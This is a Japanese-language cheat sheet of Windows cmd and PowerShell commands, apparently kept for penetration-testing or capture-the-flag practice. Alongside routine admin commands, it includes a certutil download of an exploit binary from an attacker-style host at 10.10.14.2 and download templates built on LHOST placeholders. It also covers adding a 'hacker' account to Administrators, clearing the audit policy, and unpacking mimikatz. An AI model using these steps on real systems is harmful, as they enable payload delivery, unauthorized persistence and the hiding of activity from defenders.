```toc
```
# Command Prompt
## プロセス確認
#### tasklist
---
## Login
### lock
```cmd
rundll32.exe user32.dll,LockWorkStation
```
### ログオフ
```bash
logoff
```

### シャットダウン
```bash
shutdown -a
```

#### 確認せず実行
```bash
shutdown -f
```
```bash
shutdown -f -r
```
```bash
shutdown -f -t30
```

## 他者の権限でコマンド実行

#### runas
```bash
runas /user:Administrator cmd
```

##### 認証情報を消さない
```bash
runas /user:Administrator /savecred "notepad.exe"
```
※通常は使用しない
---
## 名前解決

#### nslookup
```bash
nslookup -type=TXT ドメイン
```

---
## ハッシュ値の取得

#### certutil
```bash
certutil -hashfile ファイル名 sha1
```
![image](https://github.com/user-attachments/assets/fc7eb7a4-8a53-47cb-ab03-228bf7e7e4f7)
---
## ファイル関連

### ファイル探索

##### findstr
```bash
C:\>tasklist | findstr CloudMe

# 除外
tasklist | findstr /V CloudMe
```

##### gc
![image](https://github.com/user-attachments/assets/761eb345-177f-4d8d-b461-b8323c1ce99b)

### Web
```bash
certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe exploit.exe
```
![image](https://github.com/user-attachments/assets/0e89cadd-d41c-471d-9dae-8fc0d7a61cde)

#### 監査ポリシー
- ポリシーの確認
```bash
auditpol /get /category:*
```

- ポリシーの有効化
```bash
auditpol /set /category:"system","account logon" /success:enable /failure:enable
```

- 監査無し
```bash
auditpol /clear /y
```

- Domainサービス列挙
```bash
setspn -T ドメイン -F -Q */*
```

## ユーザ関連

- ユーザの追加
```bash
net user hacker hacker123 /add
```
```bash
net localgroup Administrators hacker /add
```
```bash
net localgroup "Remote Desktop Users" hacker /ADD
```

- パスワード変更
```bash
net user hacker newpassword
```
```bash
net user /domain hacker newpassword
```

### コンパイル
```bash
gcc hello.c -o hello.exe
```

# PowerShell
## プロパティ
### プロパティの確認方法

1. Get-Member を使用する
```bash
Get-Process | Get-Member
```

2. Select-Object -Property * を使用する
```bash
Get-Process | Select-Object -First 1 -Property *
```

### プロパティを確認してからの使用例

- 例1: Get-Process のプロパティを使用する
```bash
Get-Process | Select-Object -Property Name, CPU
```

- 例2: Where-Object で条件を指定する
```bash
Get-Process | Where-Object -FilterScript { $_.CPU -gt 0.1 }
```
---
## Web
### Download
```bash
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```
```bash
iwr -uri http://lhost/file -Outfile file
```
```bash
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```
```bash
copy \\kali\share\file .
```
---
## ファイル操作
### 解凍
```bash
Expand-Archive -Path .\mimikatz.zip
```
---
## PowerCLI

---
# Event Viewer

## Application

## Security
- ユーザ追加（4720）
- プロセス作成（4688）

## System
- シャットダウン開始時刻 (ID 1074)

# その他

## 証明書のインポート
- ［スタート］→［ファイル名を指定して実行］をクリックし、名前の枠に「certmgr.msc」と入力して［OK］をクリックします。証明書管理画面が表示されますので、[信頼されたルート証明機関]の証明書フォルダを右クリックして、「すべてのタスク」から「インポート」を選択します

